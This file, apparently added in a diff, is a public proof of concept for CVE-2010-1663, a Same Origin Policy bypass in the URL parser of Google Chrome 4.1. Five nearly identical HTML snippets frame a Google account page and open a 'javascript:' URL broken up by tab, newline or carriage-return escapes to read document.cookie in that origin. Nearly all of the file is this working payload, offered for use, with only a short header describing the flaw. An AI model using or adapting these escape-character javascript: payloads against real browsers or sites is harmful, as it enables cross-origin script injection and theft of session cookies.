@@ -1,0 +1,31 @@
+#	Google Chrome 4.1.249.1059 Cross Origin Bypass in Google URL (GURL)
+#
+#	CVE-ID: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1663
+#
+#	Author: Jordi Chancel
+#
+#	Software Link: http://googlechromereleases.blogspot.com/2010/04/stable-update-bug-and-security-fixes.html
+#
+#	Description: {
+#		The Google URL Parsing Library (aka google-url or GURL) in Google Chrome 
+#		before 4.1.249.1064 allows remote attackers to bypass the Same Origin Policy 
+#		via CHARACTER TABULATION or others escape characters inside javascript: protocol string. }
+#
+#	Some PoC : 
+
+<iframe name="test" src="https://www.google.com/accounts/ManageAccount?hl=fr"></iframe> 
+<a href="#" value="test" onclick="window.open('javascr\u0009ipt:alert(document.cookie)','test')" >Inject JavaScript</a>
+----
+<iframe name="test" src="https://www.google.com/accounts/ManageAccount?hl=fr"></iframe> 
+<a href="#" value="test" onclick="window.open('javascr\x09ipt:alert(document.cookie)','test')" >Inject JavaScript</a>
+----
+<iframe name="test" src="https://www.google.com/accounts/ManageAccount?hl=fr"></iframe> 
+<a href="#" value="test" onclick="window.open('javascr\nipt:alert(document.cookie)','test')" >Inject JavaScript</a>
+----
+<iframe name="test" src="https://www.google.com/accounts/ManageAccount?hl=fr"></iframe> 
+<a href="#" value="test" onclick="window.open('javascr\ript:alert(document.cookie)','test')" >Inject JavaScript</a>
+----
+<iframe name="test" src="https://www.google.com/accounts/ManageAccount?hl=fr"></iframe> 
+<a href="#" value="test" onclick="window.open('javascr\tipt:alert(document.cookie)','test')" >Inject JavaScript</a>
+
+Greetz : Xylitol , Eddy Bordi , 599eme Man , Gnouf , CTZ .
